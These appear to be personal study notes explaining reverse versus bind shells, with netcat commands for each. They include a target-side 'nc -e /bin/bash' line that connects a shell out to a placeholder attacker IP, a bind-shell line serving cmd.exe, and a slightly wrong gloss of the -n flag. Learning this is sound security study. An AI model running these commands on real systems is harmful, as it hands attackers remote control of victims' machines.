#### Remote system interaction
* `reverse` shell - when we force the remote server to connect to our server.
	* the listener runs on the attacker's machine
	* the target connects to the attacker's machine with a shell
	* the attacker doesn't need to know the victim's IP
* `bind` shell - when we force remote server to open up a port which we can connect to in order to execute further commands. 
	* the listener on the server computer
	* the attacker need to know the IP address of the victim
	


### Tools
- Netcat
- Socat
- Metasploit - multi/handler
- Msfvenom

### simulating Reverse vs Bind shell
#### Reverse shell
Start listening on the attacker side
```zsh
sudo nc -lvnp <port>
```

Initiating connection from target side
```zsh
nc <attacker-ip> <port> -e /bin/bash
```

> the `-e` flag, which stands for `execute` instructs `nc` to execute the command that follows it after establishing a connection.

#### Bind shell
On the target machine (assume we're on the window machine - that's why we included `cmd.exe` file instead)
```zsh
nc -lvnp <port> -e "cmd.exe"
```

Connect to that service form the attacker `pc`
```zsh
nc <targets-ip> <port>
```


### Netcat
Time to explain the `-lvnp` thing
 - l - listening
 - v - verbose
 - n - host name resolution, `DNS`
 - p - port specification
